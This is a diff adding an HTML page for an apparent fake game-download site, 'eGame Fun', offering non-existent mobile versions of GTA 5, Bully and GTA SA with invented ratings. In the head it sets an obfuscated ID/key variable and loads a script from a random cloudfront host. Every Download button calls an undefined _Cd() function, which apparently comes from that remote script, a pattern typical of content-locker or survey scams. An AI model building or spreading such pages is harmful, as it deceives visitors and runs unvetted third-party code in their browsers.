@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+   <script type="text/javascript">
+    var JrQny_CfZ_FEbmKc={"it":4473292,"key":"9ce0e"};
+</script>
+<script src="https://d2yc6hxtq0phup.cloudfront.net/4b1d1f3.js"></script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EGame Fun - Top Android and iOS Games</title>
+  <meta name="description" content="Discover top mobile games like GTA 5, Bully, and GTA SA with user ratings and download counts. eGame Fun is your go-to destination for mobile gaming!">
+  <meta name="keywords" content="games, download games, modded games, GTA 5 mobile, Bully mobile, GTA SA mobile, Android games, iOS games">
+  <meta name="author" content="eGame Fun">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      background: linear-gradient(135deg, #1e1e2f, #3a3a5c);
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: fadeIn 1.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .logo {
+      text-align: center;
+      margin-top: 30px;
+    }
+
+    .logo img {
+      width: 100px;
+    }
+
+    .logo h1 {
+      font-size: 28px;
+      color: #00ffc8;
+      margin-top: 10px;
+      animation: slideDown 1s ease-in-out;
+    }
+
+    @keyframes slideDown {
+      from { transform: translateY(-20px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    .search-box {
+      margin: 25px auto;
+    }
+
+    .search-box input[type="text"] {
+      padding: 10px;
+      width: 320px;
+      border-radius: 10px;
+      border: none;
+      outline: none;
+      font-size: 16px;
+      text-align: left;
+    }
+
+    .games-list {
+      background-color: #2e2e4e;
+      border-radius: 20px;
+      padding: 30px;
+      width: 90%;
+      max-width: 650px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      animation: fadeIn 2s ease-in-out;
+    }
+
+    .game-item {
+      display: flex;
+      align-items: center;
+      margin-bottom: 25px;
+      transition: transform 0.3s ease;
+    }
+
+    .game-item:hover {
+      transform: scale(1.03);
+    }
+
+    .game-item img {
+      width: 65px;
+      height: 65px;
+      border-radius: 10px;
+      margin-right: 15px;
+    }
+
+    .game-info h3 {
+      margin: 0;
+      font-size: 20px;
+      color: #00ffc8;
+    }
+
+    .game-info p {
+      margin: 4px 0;
+      color: #cccccc;
+      font-size: 14px;
+    }
+
+    .game-info button {
+      text-decoration: none;
+      color: #ffffff;
+      background-color: #00ffc8;
+      padding: 6px 16px;
+      border-radius: 8px;
+      font-weight: bold;
+      margin-top: 6px;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .game-info button:hover {
+      background-color: #00cfa8;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo">
+    <img src="/mnt/data/9e22b530-0570-428a-81c6-5ba28a73bb54.png" alt="logo">
+    <h1>eGame Fun</h1>
+  </div>
+
+  <div class="search-box">
+    <input type="text" id="search" placeholder="Search for a game..." onkeyup="searchGames()">
+  </div>
+
+  <div class="games-list" id="games">
+    <div class="game-item">
+      <img src="https://www2.0zz0.com/2025/04/20/14/782745281.png" alt="GTA">
+      <div class="game-info">
+        <h3>GTA 5 Mobile</h3>
+        <p>ANDROID & IOS</p>
+        <p>⭐ 4.6 | 📥 10K+ Downloads</p>
+        <button onclick="_Cd()">Download</button>
+      </div>
+    </div>
+
+    <div class="game-item">
+      <img src="https://www2.0zz0.com/2025/04/20/14/155262837.png" alt="Bully">
+      <div class="game-info">
+        <h3>Bully Mobile</h3>
+        <p>ANDROID & IOS</p>
+        <p>⭐ 4.3 | 📥 3K+ Downloads</p>
+        <button onclick="_Cd()">Download</button>
+      </div>
+    </div>
+
+    <div class="game-item">
+      <img src="https://www2.0zz0.com/2025/04/20/14/995968049.png" alt="GTA SA">
+      <div class="game-info">
+        <h3>GTA SA Mobile</h3>
+        <p>ANDROID & IOS</p>
+        <p>⭐ 4.5 | 📥 8K+ Downloads</p>
+        <button onclick="_Cd()">Download</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function searchGames() {
+      const input = document.getElementById('search').value.toLowerCase();
+      const games = document.getElementById('games').children;
+
+      for (let i = 0; i < games.length; i++) {
+        const title = games[i].querySelector('h3');
+        if (title) {
+          const gameTitle = title.textContent.toLowerCase();
+          games[i].style.display = gameTitle.includes(input) ? 'flex' : 'none';
+        }
+      }
+    }
+  </script>
+</body>
+</html>
